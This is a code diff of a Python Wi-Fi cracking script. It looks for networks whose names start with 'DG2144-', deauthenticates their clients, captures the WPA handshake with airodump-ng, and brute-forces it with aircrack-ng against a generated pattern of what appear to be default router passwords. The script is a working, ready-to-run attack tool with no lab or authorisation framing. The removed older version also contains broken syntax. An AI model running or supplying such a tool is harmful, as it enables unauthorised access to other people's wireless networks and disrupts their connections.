@@ -46,84 +46,120 @@ import subprocess
 import time
 import os
 import re
+import sys
+import random
 
-# Replace wlan0 with your wireless interface
-def generate_combinations():
-    first_part = "BS10096"
-    combinations = []
+INTERFACE = "wlan0"
 
-    for i in range(1000): 
-        for j in range(10000): 
-            combinations.append(f"{first_part}{i:03}00{j:04}")
-    return combinations
+def check_root():
+    if os.geteuid() != 0:
+        print("This script must be run as root!")
+        sys.exit(1)
 
-def save_combinations_to_file(combinations, filename='combinations.txt'):
-    with open(filename, 'w') as f:
-        for combo in combinations:
-            f.write(combo + '\n')
+def generate_combinations(i_range, j_range):
+    """Generator that yields passwords with randomized j values for each i"""
+    for i in i_range:
+        # Generate all possible j values and shuffle them
+        j_values = list(j_range)
+        random.shuffle(j_values)
+        
+        for j in j_values:
+            yield f"BS10096{i:03}00{j:04}"
 
 def scan_for_wifi():
-    print("Scanning for Wi-Fi networks...")
-    output = subprocess.check_output(["airodump-ng", "wlan0"], universal_newlines=True) 
-    return output
+    print("[+] Scanning for Wi-Fi networks...")
+    try:
+        result = subprocess.run(["airodump-ng", INTERFACE],
+                               capture_output=True,
+                               text=True,
+                               timeout=15)
+        return result.stdout
+    except subprocess.TimeoutExpired:
+        return ""
 
-def extract_bssid(output, target_ssid):
-    bssid_pattern = re.compile(r'([0-9A-Fa-f:]{17})\s+.*\s+{}\s+'.format(target_ssid))
-    bssids = bssid_pattern.findall(output)
-    return bssids
-
+def extract_network_info(output, target_ssid):
+    pattern = re.compile(
+        r'^([0-9A-Fa-f:]{17})\s+.*?\s+(\d+)\s+.*\s{}(?:\s*)$'.format(re.escape(target_ssid)),
+        re.MULTILINE
+    )
+    return pattern.findall(output)
 
 def deauth_clients(bssid):
-    print(f"Deauthenticating clients from {bssid}...")
-    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, "wlan0"]) 
+    print(f"[!] Deauthenticating clients on {bssid}...")
+    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, INTERFACE],
+                  stdout=subprocess.DEVNULL,
+                  stderr=subprocess.DEVNULL)
 
-def capture_handshake(bssid, output_file='captured_handshake.cap'):
-    print(f"Capturing handshake for {bssid}...")
-    subprocess.run(["airodump-ng", "--bssid", bssid, "-c", "6", "-w", output_file, "wlan0"]) 
-    time.sleep(30)  # Wait for the handshake def crack_handshake(bssid, combinations_file='combinations.txt', handshake_file='captured_handshake.cap'):
-    print(f"Cracking handshake for {bssid}...")
-    subprocess.run(["aircrack-ng", "-w", combinations_file, "-b", bssid, handshake_file])
+def capture_handshake(bssid, channel):
+    print(f"[+] Starting handshake capture on channel {channel}")
+    filename = f"capture_{bssid.replace(':', '')}"
+    proc = subprocess.Popen(["airodump-ng", "--bssid", bssid, "-c", str(channel),
+                            "-w", filename, INTERFACE],
+                           stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL)
+    return proc, filename
 
-def print_banner():
-    banner = r"""
-                 d8, d8b                                                    d8,
-                `8P  ?88                                                   `8P 
-                      88b                                                      
- ?88   d8P  d8P  88b  888  d88' d888b8b   d8888b   88bd88b  ?88   d8P  d8P  88b
- d88  d8P' d8P'  88P  888bd8P' d8P' ?88  d8P' ?88  88P' ?8b d88  d8P' d8P'  88P
- ?8b ,88b ,88'  d88  d88888b   88b  ,88b 88b  d88 d88   88P ?8b ,88b ,88'  d88 
- `?888P'888P'  d88' d88' `?88b,`?88P'`88b`?8888P'd88'   88b `?888P'888P'  d88' 
-
-    """                                                                          
-    print(banner)                                                                 
+def crack_handshake(bssid, cap_file):
+    """Crack handshake with randomized j values for each i"""
+    print("[!] Starting randomized cracking process...")
+    
+    # Configure ranges (adjust these values as needed)
+    i_range = range(0, 1000)    # 000-999 for middle numbers
+    j_range = range(0, 10000)   # 0000-9999 for end numbers
+    
+    # Start aircrack-ng process
+    cracker = subprocess.Popen(["aircrack-ng", "-b", bssid, f"{cap_file}-01.cap", "-w", "-"],
+                              stdin=subprocess.PIPE,
+                              text=True)
+    
+    try:
+        # Generate and feed passwords to aircrack-ng
+        for password in generate_combinations(i_range, j_range):
+            cracker.stdin.write(password + "\n")
+            cracker.stdin.flush()
+            
+    except BrokenPipeError:
+        # This occurs when aircrack-ng exits after finding the key
+        pass
+    finally:
+        cracker.stdin.close()
+        cracker.wait()
 
 def main():
-    print_banner()
-    target_ssid = "DG2144-"
-    combinations = generate_combinations()
-    save_combinations_to_file(combinations)
-
-    # Scan for Wi-Fi networks
-    output = scan_for_wifi()
-    # Extract BSSID dynamically
-    bssids = extract_bssid(output, target_ssid)
-    if not bssids:
-        print("No BSSID found for the target SSID.")
-        return
-
-    print("Available BSSIDs:")
-    for bssid in bssids:
-        print(bssid)
-
-    # Select the first BSSID found
-    selected_bssid = bssids[0
-    # Deauthenticate clients
-    deauth_clients(selected_bssid)
-    # Capture the handshake
-    capture_handshake(selected_bssid)
-    # Crack the handshake
-    crack_handshake(selected_bssid)
+    check_root()
+    print("\n" + "="*50)
+    print("Randomized Wi-Fi Cracking Tool")
+    print("="*50 + "\n")
     
+    target_ssid = "DG2144-"
+    
+    # Scan for target network
+    scan_results = scan_for_wifi()
+    networks = extract_network_info(scan_results, target_ssid)
+    
+    if not networks:
+        print("[-] No matching networks found")
+        sys.exit(1)
+        
+    # Select first found network
+    bssid, channel = networks[0]
+    print(f"[+] Target network found: {bssid} (Channel {channel})")
+    
+    # Start handshake capture
+    capture_proc, cap_file = capture_handshake(bssid, channel)
+    
+    try:
+        time.sleep(5)
+        deauth_clients(bssid)
+        print("[*] Waiting for handshake capture (30 seconds)...")
+        time.sleep(30)
+    finally:
+        capture_proc.terminate()
+        capture_proc.wait()
+    
+    # Start randomized cracking process
+    crack_handshake(bssid, cap_file)
+
 if __name__ == "__main__":
     main()
 
